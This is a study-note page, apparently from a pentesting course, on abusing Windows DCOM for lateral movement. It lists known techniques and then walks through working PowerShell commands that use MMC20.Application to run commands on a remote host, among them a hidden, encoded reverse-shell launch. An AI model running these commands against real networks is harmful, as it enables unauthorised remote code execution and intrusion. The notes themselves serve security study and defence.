public:: true

- The [*Distributed Component Object Model*](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN) (DCOM) extends the [*Component Object Model*](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal?redirectedfrom=MSDN) (COM) created for either same-process or cross-process interaction to interaction between **multiple computers over a network**.
- Interaction is done over RPC on port **135/tcp**.
- Local administrator access is required to call the DCOM [Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager) *(which is essentially an API)*.
- Lateral Movement
	- DCOM is often exploited to perform lateral movement.
	- A list of DCOM applications can be retrieved via Powershell
	  ```powershell
	  Get-CimInstance Win32_DCOMApplication
	  ```
	- [Cybereason reported](https://www.cybereason.com/blog/dcom-lateral-movement-techniques) a collection of software that can be used to execute command on remote computers via DCOM.
		- [Excel DDE](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
		- [MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
		  id:: 65a6b37f-c4d9-4e9a-a25f-45416e4d9c51
		- [ShellWindows](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
		- ShellBrowserWindow
		- Visio Addon Execution
		- Outlook Execution WIth CreateObject and Shell.Application
		- [Arbitrary Library Load](https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52)
		- Word WLL Add-in
		- [Arbitrary Script Execution](https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/)
		- Visio ExecuteLine
		- Office Fileless Macro Execution
			- Excel
			- Word
			- PowerPoint
			- Access
		- [Office Macro Execution From Existing Documents](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
	- Let's see how to use *Microsoft Management Console* ([MMC20.Application](((65a6b37f-c4d9-4e9a-a25f-45416e4d9c51)))) to execute remote commands.
		- First we need access to a domain user which happens to be a local administrator on our remote target *(192.168.50.73)*.
		- We suppose that a valid TGT is loaded in-memory for such user in the computer from where we want to execute the attack.
		- From there we open an elevated powershell prompt
			- The MMC Application Class allows the creation of [*Application Objects*](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN) which expose the *ExecuteShellCommand* method under the *Document.ActiveView* property
			  ```powershell
			  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
			  $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
			  ```
			- or even better run a [[reverse shell]] 
			  ```powershell
			  $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG...AZQAoACkA","7")
			  ```